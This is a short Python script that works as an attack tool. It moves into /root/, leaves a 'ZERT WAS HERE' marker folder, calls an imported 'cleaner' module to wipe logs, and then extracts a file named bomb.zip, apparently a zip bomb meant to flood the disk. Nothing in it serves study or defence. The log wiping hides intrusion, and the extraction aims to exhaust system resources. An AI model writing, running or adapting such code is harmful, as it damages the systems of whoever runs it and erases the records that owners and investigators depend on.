import cleaner
import zipfile
import smtplib 
import os
import random
def main():
 create_dir()
 clean_logs()
 start_attack() 
def create_dir():
 global folder
 folder=os.getcwd()
 print(folder+"/bomb.zip")
 os.chdir('/root/')
 os.mkdir("ZERT WAS HERE")
def clean_logs():
 cleaner.main()
def start_attack():
 zip_bomb=zipfile.ZipFile(folder+"/bomb.zip")
 zip_bomb.extractall()
main()
